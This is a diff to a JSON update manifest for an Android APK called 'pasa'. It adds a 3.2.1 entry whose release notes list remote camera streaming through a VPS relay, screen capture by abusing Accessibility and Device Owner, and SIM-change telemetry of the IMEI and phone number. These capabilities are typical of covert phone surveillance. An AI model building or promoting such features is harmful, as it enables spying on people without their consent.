@@ -1,5 +1,16 @@
 [
   {
+    "versionCode": 26,
+    "versionName": "3.2.1",
+    "releaseDate": "2026-09-21",
+    "fileName": "pasa-v3.2.1-26.apk",
+    "downloadUrl": "https://pasa.izhaanintellect.fun/releases/pasa-v3.2.1-26.apk",
+    "sha256": "d698f13e6d7e8c4fcaab4959ce758c0b5c52da1ed6a1df0201faecda52b69129",
+    "size": 19051813,
+    "mandatory": false,
+    "releaseNotes": "v3.2.1: Live Video Streaming & A11y Screen Capture Fix: Near-live camera video streaming relay via VPS backend (/livestream, /stopstream); Accessibility screenshot service threading fix for Android 11-16; Robust Device Owner vs Accessibility screen recording engine fallback; Full dual-transport SIM ejection surveillance with automatic IMEI and phone number telemetry."
+  },
+  {
     "versionCode": 25,
     "versionName": "3.2.0",
     "releaseDate": "2026-09-21",
